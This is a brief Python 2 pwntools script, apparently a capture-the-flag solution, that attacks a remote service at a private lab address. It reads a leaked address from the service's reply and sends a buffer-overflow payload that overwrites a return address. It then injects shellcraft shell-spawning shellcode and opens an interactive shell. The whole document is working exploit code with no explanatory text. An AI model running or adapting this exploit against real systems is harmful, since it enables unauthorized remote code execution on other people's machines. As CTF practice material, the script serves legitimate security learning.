from pwn import *
r=remote('10.112.108.77',2333)
r.recv()
r.sendline('sscc')
d=r.recv()
add=d[35:44]
add=eval(add)+4
print add
r.send('1!000'+'AAAB'+'A'*4+p32(add)+'A'*4)
r.recv()
sh=shellcraft.sh()   
r.sendline(p32(add)+asm(sh))
r.interactive()